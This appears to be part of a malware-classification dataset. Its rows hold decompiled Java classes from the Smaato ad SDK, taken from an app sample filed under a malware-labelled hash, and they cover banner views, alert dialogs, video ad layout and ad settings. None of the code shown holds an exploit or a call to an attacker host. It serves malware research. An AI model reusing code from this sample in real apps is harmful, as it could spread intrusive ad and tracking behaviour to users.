layoutParams.topMargin=(int)o.b(Float.parseFloat(obj2),activity);         }  catch (        Exception e2) {           e2.printStackTrace();         }       }       imageView.setLayoutParams(layoutParams);     }  catch (    Exception e3) {       Log.e(""AirPlayVast"",""Error occurred while processing icon."",e3);     }     StringBuilder sb=new StringBuilder();     sb.append(VideoAdActivity.this.y.a() + "" "");     sb.append(VideoAdActivity.this.y.c());     String d=VideoAdActivity.this.y.d();     if (d != null && !d.equals("""")) {       sb.append("" - by "" + d);     }     TextView textView=new TextView(activity);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.addRule(1,102);     layoutParams2.addRule(10);     layoutParams2.leftMargin=(int)(10.0f * this.b);     textView.setLayoutParams(layoutParams2);     textView.setId(106);     textView.setSingleLine();     textView.setTextAppearance(activity,R.style.TextAppearance.Medium);     textView.setText(sb.toString());     VideoView videoView=new VideoView(activity);     videoView.setId(VideoAdActivity.ID_VIDEO_PLAYER);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);     layoutParams3.bottomMargin=(int)(this.b * 17.0f);     layoutParams3.topMargin=(int)(this.b * 17.0f);     layoutParams3.rightMargin=(int)(this.b * 30.0f);     layoutParams3.leftMargin=(int)(this.b * 30.0f);     layoutParams3.addRule(13,-1);     videoView.setLayoutParams(layoutParams3);     Button button=new Button(activity);     button.setId(VideoAdActivity.ID_SKIP_BUTTON);     RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(-2,-2);     layoutParams4.addRule(11);     layoutParams4.addRule(12);     layoutParams4.bottomMargin=(int)(35.0f * this.b);     button.setLayoutParams(layoutParams4);     button.setBackgroundColor(-16777216);     button.setTextColor(-1);     button.setTypeface(Typeface.MONOSPACE,R.style.TextAppearance.Medium);     button.setClickable(false);     button.setVisibility(8);     ImageButton imageButton=new ImageButton(activity);     imageButton.setId(107);     RelativeLayout.LayoutParams layoutParams5=new RelativeLayout.LayoutParams(-2,-2);     layoutParams5.addRule(12);     layoutParams5.addRule(9);     imageButton.setLayoutParams(layoutParams5);     imageButton.setBackgroundResource(R.drawable.ic_media_pause);     ImageButton imageButton2=new ImageButton(activity);     imageButton2.setId(VideoAdActivity.ID_MUTE_BUTTON);     RelativeLayout.LayoutParams layoutParams6=new RelativeLayout.LayoutParams(-2,-2);     layoutParams6.addRule(12);     layoutParams6.addRule(1,107);     imageButton2.setLayoutParams(layoutParams6);     imageButton2.setBackgroundResource(R.drawable.ic_lock_silent_mode_off);     ProgressBar progressBar=new ProgressBar(activity,null,R.attr.progressBarStyleHorizontal);     RelativeLayout.LayoutParams layoutParams7=new RelativeLayout.LayoutParams(-1,(int)(10.0f * this.b));     layoutParams7.addRule(12);     layoutParams7.addRule(1,VideoAdActivity.ID_MUTE_BUTTON);     layoutParams7.setMargins(((int)this.b) * 5,0,((int)this.b) * 65,(int)(this.b * 7.0f));     progressBar.setLayoutParams(layoutParams7);     progressBar.setId(VideoAdActivity.ID_SEEK_BAR);     TextView textView2=new TextView(activity);     RelativeLayout.LayoutParams layoutParams8=new RelativeLayout.LayoutParams(-2,-2);     layoutParams8.addRule(11);     layoutParams8.addRule(12);     textView2.setLayoutParams(layoutParams8);     textView2.setTextColor(-1);     textView2.setTextAppearance(activity,R.style.TextAppearance.Small);     textView2.setBackgroundColor(-16777216);     textView2.setId(111);     addView(videoView);     addView(imageView);     addView(textView);     addView(imageButton);     addView(imageButton2);     addView(progressBar);     addView(button);     addView(textView2);   }   void a(  final String str,  final ImageView imageView) throws NullPointerException {     c<Bitmap> cVar=new c<Bitmap>(){       @Override public void a(      final Bitmap bitmap){         if (bitmap != null && VideoAdActivity.this.a != null) {           VideoAdActivity.this.a.post(new Runnable(){             @Override public void run(){               imageView.setImageBitmap(bitmap);             }           } );         }       }       @Override public void a(){         new g(str,this).execute(new Void[0]);       }     } ;     if (o.o(this.c)) {       cVar.a();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AbstractAlertView.code","public abstract class AbstractAlertView<T extends StandardPublisherMethods> {   protected AlertBannerStateListener a;   T b;   private Context c;   private String d;   private AlertDialog e; class AnonymousClass1 extends CrashReportTemplate<Void> {     final AbstractAlertView a;     private final Context b;     @Override public Void b() throws Exception {       this.a.a(this.b);       this.a.a();       return null;     }   }   public void a() throws AlertViewInstantiationException {     try {       Debugger.a(new Object(){       } );       RequestsBuilder.a().a(new WebView(b()).getSettings().getUserAgentString());     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new AlertViewInstantiationException(e2);     }   } class AnonymousClass3 extends CrashReportTemplate<Void> {     final AbstractAlertView a;     private final int b;     @Override public Void b() throws Exception {       this.a.b.getAdSettings().a(this.b);       return null;     }   } class AnonymousClass4 extends CrashReportTemplate<Void> {     final AbstractAlertView a;     private final int b;     @Override public Void b() throws Exception {       this.a.b.getAdSettings().b(this.b);       return null;     }   }   public Context b(){     return this.c;   }   protected void a(  Context context){     this.c=context;   }   public String c(){     return this.d;   } class AnonymousClass5 extends CrashReportTemplate<Void> {     final AbstractAlertView a;     private final AdListenerInterface b;     @Override public Void b() throws Exception {       this.a.b.a(this.b);       return null;     }   } class AnonymousClass6 extends CrashReportTemplate<Boolean> {     final AbstractAlertView a;     private final AdListenerInterface b;     @Override public Boolean b() throws Exception {       this.a.b.b(this.b);       return false;     }   } class AnonymousClass7 extends CrashReportTemplate<Void> {     final AbstractAlertView a;     @Override public Void b() throws Exception {       if (BannerMeasurements.a().b()) {         if (Controller.a().d()) {           this.a.a();           Controller.a().c();         }         new Thread(new Runnable(){           @Override public void run(){             AnonymousClass7.this.a.b.b();           }         } ).start();       }       return null;     }   } class AnonymousClass8 extends CrashReportTemplate<Void> {     final AbstractAlertView a;     private final boolean b;     @Override public Void b() throws Exception {       this.a.b.setLocationUpdateEnabled(this.b);       return null;     }   } class AnonymousClass9 extends CrashReportTemplate<Boolean> {     final AbstractAlertView a;     @Override public Boolean b() throws Exception {       return Boolean.valueOf(this.a.b.c());     }   } class AnonymousClass10 extends CrashReportTemplate<UserSettings> {     final AbstractAlertView a;     @Override public UserSettings b() throws Exception {       return this.a.b.getUserSettings();     }   }   public AlertDialog d(){     return this.e;   }   public void a(  AlertDialog alertDialog){     this.e=alertDialog;   }   public void e(){     Debugger.a(new Object(){     } );     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         AlertDialog d=AbstractAlertView.this.d();         if (d != null) {           d.dismiss();           AbstractAlertView.this.a((AlertDialog)null);         }         return null;       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AdDownloaderInterface.code","public interface AdDownloaderInterface extends StandardPublisherMethods {   void a(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AdListenerImpl.code","public class AdListenerImpl implements AdListenerInterface {   private AdListenerImpl(){   }   AdListenerImpl(  AlertBanner alertBanner,  AdListenerImpl adListenerImpl){     this();   }   @Override public final void a(  AdDownloaderInterface adDownloaderInterface,  final ReceivedBannerInterface receivedBannerInterface) throws AlertBannerFailedToRecieveAd {     try {       Debugger.a(new Object(){       } );       if (receivedBannerInterface.a() == BannerStatus.ERROR) {         Debugger.a(new LogMessage(new StringBuilder().append(receivedBannerInterface.a()).toString(),""transitionErrorLoading"",1,DebugCategory.ERROR));         return;       }       AlertDialog.Builder builder=new AlertDialog.Builder(AlertBanner.this.b());       builder.setMessage(receivedBannerInterface.g()).setCancelable(false);       builder.setPositiveButton(""Open"",new DialogInterface.OnClickListener(){         @Override public void onClick(        final DialogInterface dialogInterface,        int i){           final ReceivedBannerInterface receivedBannerInterface2=receivedBannerInterface;           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(receivedBannerInterface2.d()));               if (AlertBanner.this.a != null) {                 AlertBanner.this.a.a();               }               AlertBanner.this.b().startActivity(intent);               dialogInterface.dismiss();               return null;             }           } .c();         }       } );       builder.setNegativeButton(""Close"",new DialogInterface.OnClickListener(){         @Override public void onClick(        DialogInterface dialogInterface,        int i){           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               if (AlertBanner.this.a != null) {                 AlertBanner.this.a.b();                 return null;               }               return null;             }           } .c();         }       } );       builder.setTitle(AlertBanner.this.c());       if (AlertBanner.this.a != null) {         AlertBanner.this.a.c();       }       AlertBanner.this.a(builder.show());       ((AdDownloaderInterface)AlertBanner.this.b).a();     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new AlertBannerFailedToRecieveAd(e2);     }   } } public class AdListenerImpl implements AdListenerInterface {   private AdListenerImpl(){   }   AdListenerImpl(  BaseView baseView,  AdListenerImpl adListenerImpl){     this();   }   @Override public final void a(  AdDownloaderInterface adDownloaderInterface,  ReceivedBannerInterface receivedBannerInterface) throws OnReceiveAdFailedException {     try {       Debugger.a(new Object(){       } );       if (receivedBannerInterface.a() == BannerStatus.ERROR) {         Debugger.a(new LogMessage(new StringBuilder().append(receivedBannerInterface.a()).toString(),""transitionErrorLoading"",1,DebugCategory.ERROR));         BaseView.this.getLoadingState().f();       }  else {         BaseView.this.setNextPackage(DefaultFactory.a().a(receivedBannerInterface.b()));         BaseView.this.getNextPackage().a(receivedBannerInterface);         BaseView.this.getLoadingState().b();       }       BaseView.this.k=false;     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new OnReceiveAdFailedException(e2);     }   } } public class AdListenerImpl implements AdListenerInterface {   private AdListenerImpl(){   }   AdListenerImpl(  FullScreenBanner fullScreenBanner,  AdListenerImpl adListenerImpl){     this();   }   @Override public final void a(  AdDownloaderInterface adDownloaderInterface,  ReceivedBannerInterface receivedBannerInterface) throws FullScreenBannerFailedToReceiveAd {     try {       Debugger.a(new Object(){       } );       if (receivedBannerInterface.a() == BannerStatus.ERROR) {         FullScreenBanner.this.d=receivedBannerInterface.a();         FullScreenBanner.this.e=null;       }  else {         FullScreenBanner.this.d=receivedBannerInterface.a();         FullScreenBanner.this.e=receivedBannerInterface;       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new FullScreenBannerFailedToReceiveAd(e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AdListenerInterface.code","public interface AdListenerInterface {   void a(  AdDownloaderInterface adDownloaderInterface,  ReceivedBannerInterface receivedBannerInterface) throws AdReceiveFailed ; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AdSettings.code","public class AdSettings implements AdSettingsInterface {   private static int[] h;   private AdType a=AdType.ALL;   private AdDimension b=AdDimension.DEFAULT;   private int c=0;   private int d=0;   private int e=0;   private int f=0;   private boolean g=true;   static int[] h(){     int[] iArr=h;     if (iArr == null) {       iArr=new int[AdDimension.valuesCustom().length];       try {         iArr[AdDimension.DEFAULT.ordinal()]=1;       }  catch (      NoSuchFieldError e) {       }       try {         iArr[AdDimension.INTERSTITIAL.ordinal()]=5;       }  catch (      NoSuchFieldError e2) {       }       try {         iArr[AdDimension.LEADERBOARD.ordinal()]=3;       }  catch (      NoSuchFieldError e3) {       }       try {         iArr[AdDimension.MEDIUMRECTANGLE.ordinal()]=2;       }  catch (      NoSuchFieldError e4) {       }       try {         iArr[AdDimension.NOT_SET.ordinal()]=6;       }  catch (      NoSuchFieldError e5) {       }       try {         iArr[AdDimension.SKYSCRAPER.ordinal()]=4;       }  catch (      NoSuchFieldError e6) {       }       h=iArr;     }     return iArr;   }   public final int a(){     return this.e;   }   public final void a(  int i){     this.e=i;   }   public final int b(){     return this.f;   }   public final void b(  int i){     this.f=i;   }   public final AdType c(){     return this.a;   }   public final void a(  AdType adType){     this.a=adType;   }   public final AdDimension d(){     return this.b;   }   public final void a(  AdDimension adDimension){     this.b=adDimension;   }   public int e() throws BannerWidthForAdDimensionFailed {     try {       if (this.c == 0) { switch (h()[this.b.ordinal()]) { case 1:           this.c=320;         break; case 2:       this.c=AdException.INVALID_REQUEST;     break; case 3:   this.c=728; break; case 4: this.c=120; break; case 5: this.c=DeviceDataCollector.a().i(); break; } } return this.c; }  catch (RuntimeException e) { throw e; } catch (Exception e2) { throw new BannerWidthForAdDimensionFailed(e2); } } public void c(int i){ this.c=i; } public int f() throws BannerHeightForAdDimensionFailed { try { if (this.d == 0) { switch (h()[this.b.ordinal()]) { case 1: this.d=50; break; case 2: this.d=250; break; case 3: this.d=90; break; case 4: this.d=Values.MAX_AUTO_RELOAD; break; case 5: this.d=DeviceDataCollector.a().j(); break; } } return this.d; }  catch (RuntimeException e) { throw e; } catch (Exception e2) { throw new BannerHeightForAdDimensionFailed(e2); } } public void d(int i){ this.d=i; } public boolean g(){ return this.g; } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AdSettingsInterface.code","public interface AdSettingsInterface { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AlertBanner.code","public class AlertBanner extends AbstractAlertView<AdDownloaderInterface> {   @Override public void a() throws AlerBannerInstantiationException {     try {       Debugger.a(new Object(){       } );       super.a();       this.b=DefaultFactory.a().a(b());       ((AdDownloaderInterface)this.b).a(f());       ((AdDownloaderInterface)this.b).getAdSettings().a(AdType.TEXT);     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new AlerBannerInstantiationException(e2);     }   }   protected AdListenerInterface f(){     return new AdListenerImpl(this,null);   } public class AdListenerImpl implements AdListenerInterface {     private AdListenerImpl(){     }     AdListenerImpl(    AlertBanner alertBanner,    AdListenerImpl adListenerImpl){       this();     }     @Override public final void a(    AdDownloaderInterface adDownloaderInterface,    final ReceivedBannerInterface receivedBannerInterface) throws AlertBannerFailedToRecieveAd {       try {         Debugger.a(new Object(){         } );         if (receivedBannerInterface.a() == BannerStatus.ERROR) {           Debugger.a(new LogMessage(new StringBuilder().append(receivedBannerInterface.a()).toString(),""transitionErrorLoading"",1,DebugCategory.ERROR));           return;         }         AlertDialog.Builder builder=new AlertDialog.Builder(AlertBanner.this.b());         builder.setMessage(receivedBannerInterface.g()).setCancelable(false);         builder.setPositiveButton(""Open"",new DialogInterface.OnClickListener(){           @Override public void onClick(          final DialogInterface dialogInterface,          int i){             final ReceivedBannerInterface receivedBannerInterface2=receivedBannerInterface;             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(receivedBannerInterface2.d()));                 if (AlertBanner.this.a != null) {                   AlertBanner.this.a.a();                 }                 AlertBanner.this.b().startActivity(intent);                 dialogInterface.dismiss();                 return null;               }             } .c();           }         } );         builder.setNegativeButton(""Close"",new DialogInterface.OnClickListener(){           @Override public void onClick(          DialogInterface dialogInterface,          int i){             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 if (AlertBanner.this.a != null) {                   AlertBanner.this.a.b();                   return null;                 }                 return null;               }             } .c();           }         } );         builder.setTitle(AlertBanner.this.c());         if (AlertBanner.this.a != null) {           AlertBanner.this.a.c();         }         AlertBanner.this.a(builder.show());         ((AdDownloaderInterface)AlertBanner.this.b).a();       }  catch (      RuntimeException e) {         throw e;       } catch (      Exception e2) {         throw new AlertBannerFailedToRecieveAd(e2);       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AlertBannerStateListener.code","public interface AlertBannerStateListener {   void a();   void b();   void c(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AnonymousClass1.code","class AnonymousClass1 extends CrashReportTemplate<Void> {   final AbstractAlertView a;   private final Context b;   @Override public Void b() throws Exception {     this.a.a(this.b);     this.a.a();     return null;   } } class AnonymousClass1 extends CrashReportTemplate<Void> {   final FullScreenBanner a;   @Override public Void b() throws Exception {     this.a.c=new AlertDialog.Builder(this.a.b());     return null;   } } class AnonymousClass1 extends CrashReportTemplate<Void> {   final ToasterBanner a;   @Override public Void b() throws Exception {     this.a.e();     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AnonymousClass10.code","class AnonymousClass10 extends CrashReportTemplate<UserSettings> {   final AbstractAlertView a;   @Override public UserSettings b() throws Exception {     return this.a.b.getUserSettings();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AnonymousClass16.code","public class AnonymousClass16 extends CrashReportTemplate<Void> {   AnonymousClass16(){   }   @Override public Void b() throws Exception {     if (ToasterBanner.this.h()) {       ((RelativeLayout.LayoutParams)ToasterBanner.this.d.getLayoutParams()).addRule(12);       ToasterBanner.this.d.requestLayout();       ToasterBanner.this.setVisibility(0);       ToasterBanner.this.d.setVisibility(0);       ToasterBanner.this.c.setVisibility(0);       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)ToasterBanner.this.getContext().getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       int measuredHeight=displayMetrics.heightPixels - ToasterBanner.this.b.getMeasuredHeight();       ToasterBanner.this.getLocationOnScreen(new int[2]);       final int measuredHeight2=(displayMetrics.heightPixels - ToasterBanner.this.getMeasuredHeight()) - measuredHeight;       ObjectAnimator ofFloat=ObjectAnimator.ofFloat(ToasterBanner.this,""translationY"",ToasterBanner.this.b.getMeasuredHeight(),measuredHeight2 - 20);       ofFloat.setDuration(300L);       ofFloat.start();       ofFloat.addListener(new Animator.AnimatorListener(){         @Override public void onAnimationStart(        Animator animator){         }         @Override public void onAnimationRepeat(        Animator animator){         }         @Override public void onAnimationEnd(        Animator animator){           final int i=measuredHeight2;           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               ObjectAnimator ofFloat2=ObjectAnimator.ofFloat(ToasterBanner.this,""translationY"",i - 20,i);               ofFloat2.setDuration(100L);               ofFloat2.start();               return null;             }           } .c();         }         @Override public void onAnimationCancel(        Animator animator){         }       } );     }  else {       ToasterBanner.this.f();     }     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AnonymousClass18.code","public class AnonymousClass18 extends CrashReportTemplate<Void> {   AnonymousClass18(){   }   @Override public Void b() throws Exception {     if (ToasterBanner.this.h()) {       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)ToasterBanner.this.getContext().getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       int measuredHeight=displayMetrics.heightPixels - ToasterBanner.this.b.getMeasuredHeight();       int[] iArr=new int[2];       ToasterBanner.this.getLocationOnScreen(iArr);       int measuredHeight2=(displayMetrics.heightPixels - ToasterBanner.this.getMeasuredHeight()) - measuredHeight;       if (iArr[1] < displayMetrics.heightPixels) {         ObjectAnimator ofFloat=ObjectAnimator.ofFloat(ToasterBanner.this,""translationY"",measuredHeight2,ToasterBanner.this.b.getMeasuredHeight());         ofFloat.setDuration(300L);         ofFloat.addListener(new Animator.AnimatorListener(){           @Override public void onAnimationStart(          Animator animator){           }           @Override public void onAnimationRepeat(          Animator animator){           }           @Override public void onAnimationEnd(          Animator animator){             new CrashReportTemplate<Void>(){               @Override public Void b() throws Exception {                 ToasterBanner.this.setVisibility(8);                 ToasterBanner.this.d.setVisibility(8);                 ToasterBanner.this.c.setVisibility(8);                 return null;               }             } .c();           }           @Override public void onAnimationCancel(          Animator animator){           }         } );         ofFloat.start();       }     }  else {       ToasterBanner.this.g();     }     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AnonymousClass3.code","class AnonymousClass3 extends CrashReportTemplate<Void> {   final AbstractAlertView a;   private final int b;   @Override public Void b() throws Exception {     this.a.b.getAdSettings().a(this.b);     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AnonymousClass4.code","class AnonymousClass4 extends CrashReportTemplate<Void> {   final AbstractAlertView a;   private final int b;   @Override public Void b() throws Exception {     this.a.b.getAdSettings().b(this.b);     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AnonymousClass5.code","class AnonymousClass5 extends CrashReportTemplate<Void> {   final AbstractAlertView a;   private final AdListenerInterface b;   @Override public Void b() throws Exception {     this.a.b.a(this.b);     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AnonymousClass6.code","class AnonymousClass6 extends CrashReportTemplate<Boolean> {   final AbstractAlertView a;   private final AdListenerInterface b;   @Override public Boolean b() throws Exception {     this.a.b.b(this.b);     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AnonymousClass7.code","class AnonymousClass7 extends CrashReportTemplate<Void> {   final AbstractAlertView a;   @Override public Void b() throws Exception {     if (BannerMeasurements.a().b()) {       if (Controller.a().d()) {         this.a.a();         Controller.a().c();       }       new Thread(new Runnable(){         @Override public void run(){           AnonymousClass7.this.a.b.b();         }       } ).start();     }     return null;   } } public class AnonymousClass7 extends CrashReportTemplate<Void> {   AnonymousClass7(){   }   @Override public Void b() throws Exception {     if (BannerMeasurements.a().b()) {       if (Controller.a().d() && BaseView.this.getBannerState().a() != BannerState.State.STATE_BANNEREXPANDED) {         BaseView.this.d();         Controller.a().c();       }       new Thread(new Runnable(){         @Override public void run(){           new CrashReportTemplate<Void>(){             @Override public Void b() throws Exception {               if (BaseView.this.getLoadingState().a()) {                 System.gc();                 return null;               }               return null;             }           } .c();         }       } ).start();     }     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AnonymousClass8.code","class AnonymousClass8 extends CrashReportTemplate<Void> {   final AbstractAlertView a;   private final boolean b;   @Override public Void b() throws Exception {     this.a.b.setLocationUpdateEnabled(this.b);     return null;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\AnonymousClass9.code","class AnonymousClass9 extends CrashReportTemplate<Boolean> {   final AbstractAlertView a;   @Override public Boolean b() throws Exception {     return Boolean.valueOf(this.a.b.c());   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\attr.code","public static final class attr {   public static int AdType=2130772004;   public static int adDimension=2130772001;   public static int adSize=dev.camera360.collage.R.attr.adSize;   public static int adSpaceId=2130772005;   public static int adUnitId=dev.camera360.collage.R.attr.adUnitId;   public static int age=2130771998;   public static int autoReloadEnabled=2130771987;   public static int autoReloadFrequency=2130771986;   public static int backgroundColor=2130771985;   public static int bannerHeight=2130772003;   public static int bannerWidth=2130772002;   public static int cameraBearing=dev.camera360.collage.R.attr.testing;   public static int cameraTargetLat=dev.camera360.collage.R.attr.isGoneWithoutAd;   public static int cameraTargetLng=dev.camera360.collage.R.attr.gif;   public static int cameraTilt=dev.camera360.collage.R.attr.paused;   public static int cameraZoom=dev.camera360.collage.R.attr.gifMoviewViewStyle;   public static int city=2130771994;   public static int country=2130771993;   public static int fontColor=2130771984;   public static int gender=2130771999;   public static int keywordList=2130771990;   public static int latitude=2130771996;   public static int loadNewBanner=2130771988;   public static int locationUpdateEnabled=2130771989;   public static int longitude=2130771997;   public static int mapType=dev.camera360.collage.R.attr.keywords;   public static int publisherId=2130772006;   public static int region=2130771992;   public static int searchQuery=2130771991;   public static int uiCompass=dev.camera360.collage.R.attr.test_mode;   public static int uiRotateGestures=dev.camera360.collage.R.attr.banner_type;   public static int uiScrollGestures=dev.camera360.collage.R.attr.animation;   public static int uiTiltGestures=dev.camera360.collage.R.attr.placementType;   public static int uiZoomControls=dev.camera360.collage.R.attr.canShowMR;   public static int uiZoomGestures=2130771981;   public static int useViewLifecycle=2130771982;   public static int userProfileEnabled=2130772000;   public static int zOrderOnTop=2130771983;   public static int zip=2130771995; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\BannerHandler.code","public class BannerHandler extends Handler {   private WeakReference<BaseView> b;   private BaseView c;   private BannerHandler(  BaseView baseView){     this.b=null;     this.c=baseView;   }   BannerHandler(  BannerView bannerView,  BaseView baseView,  BannerHandler bannerHandler){     this(baseView);   }   protected WeakReference<BaseView> a(){     if (this.b == null) {       this.b=new WeakReference<>(this.c);     }     return this.b;   }   @Override public void handleMessage(  final Message message){     super.handleMessage(message);     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BaseView baseView=BannerHandler.this.a().get();         if (baseView != null) {           if (message.what == 101) {             baseView.getBannerState().b();             BannerAnimator.a().a(message.arg1,message.arg2,BannerView.this.getCurrentPackage(),baseView,BannerView.this.h);             BannerView.this.a();             BannerMeasurements.a().e();             BannerView.this.a();           }  else           if (message.what == 102) {             if (baseView.getCurrentPackage().e()) {               baseView.getBannerState().d();             }  else {               baseView.getBannerState().c();             }             BannerView.this.j();           }  else           if (message.what == 103) {             Log.e(getClass().getCanonicalName(),""resize"");             BannerView.this.getCurrentPackage().c().setLayoutParams(new FrameLayout.LayoutParams(message.arg1,message.arg2));             BannerView.this.getCurrentPackage().c().requestLayout();           }  else           if (message.what == 107) {             BannerAnimator.a().a(true);             baseView.getBannerState().d();           }         }         return null;       }     } .c();   } } public class BannerHandler extends Handler {   private WeakReference<BaseView> b;   private BaseView c;   private BannerHandler(  BaseView baseView){     this.b=null;     this.c=baseView;   }   BannerHandler(  FullScreenView fullScreenView,  BaseView baseView,  BannerHandler bannerHandler){     this(baseView);   }   protected WeakReference<BaseView> a(){     if (this.b == null) {       this.b=new WeakReference<>(this.c);     }     return this.b;   }   @Override public void handleMessage(  final Message message){     super.handleMessage(message);     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         BaseView baseView=BannerHandler.this.a().get();         if (baseView != null) {           if (message.what == 101) {             baseView.getBannerState().b();             BannerAnimator.a().a(message.arg1,message.arg2,FullScreenView.this.getCurrentPackage(),baseView,FullScreenView.this.h);           }  else           if (message.what == 102) {             baseView.getBannerState().c();           }  else           if (message.what == 107) {             baseView.getBannerState().c();           }         }         return null;       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma\BannerStateDelegateImp.code","public class BannerStateDelegateImp implements BannerStateDelegate {   private WeakReference<BaseView> a;   public BannerStateDelegateImp(  BaseView baseView){     this.a=new WeakReference<>(baseView);   }   @Override public void a() throws UnableToTriggerTransitionDisplayBanner {     try {       Debugger.a(new Object(){       } );       BaseView baseView=this.a.get();       if (baseView != null) {         baseView.e();       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToTriggerTransitionDisplayBanner(e2);     }   }   @Override public void b() throws UnableToEnterBannerStateExpanded {     try {       Debugger.a(new Object(){       } );       BaseView baseView=this.a.get();       if (baseView != null) {         baseView.getLoadingState().c();       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToEnterBannerStateExpanded(e2);     }   }   @Override public void c() throws UnableToExitBannerStateExpanded {     try {       Debugger.a(new Object(){       } );       BaseView baseView=this.a.get();       if (baseView != null) {         baseView.getLoadingState().d();         BannerAnimator.a().a(baseView.getCurrentPackage(),baseView);       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToExitBannerStateExpanded(e2);     }   }   @Override public void d() throws UnableToTriggerTransitionCloseNoOrmmaBanner {     try {       Debugger.a(new Object(){       } );       BaseView baseView=this.a.get();       if (baseView != null && baseView.getBannerStateListener() != null) {         BannerStateListener bannerStateListener=baseView.getBannerStateListener();         if (bannerStateListener != null) {           bannerStateListener.b(baseView);         }         baseView.getCurrentPackage().b();       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToTriggerTransitionCloseNoOrmmaBanner(e2);     }   }   @Override public void e() throws UnableToTriggerTransitionCloseOrmmaBanner {     try {       Debugger.a(new Object(){       } );       BaseView baseView=this.a.get();       BannerStateListener bannerStateListener=baseView.getBannerStateListener();       if (bannerStateListener != null) {         bannerStateListener.b(baseView);       }       if (baseView != null && baseView.getCurrentPackage() != null) {         baseView.getCurrentPackage().b();       }     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new UnableToTriggerTransitionCloseOrmmaBanner(e2);     }   }   @Override public void f() throws UnableToSetBannerStateToEmpty {   }   @Override public void g() throws UnableToExitEmptyState {   }   @Override public void h() throws BannerDisplayedEnteredFailedException {   }   @Override public void i() throws UnableToExitBannerStateDisplayed {   }   @Override public void j() throws UnableToTriggerTransitionExpandBanner {   } } "
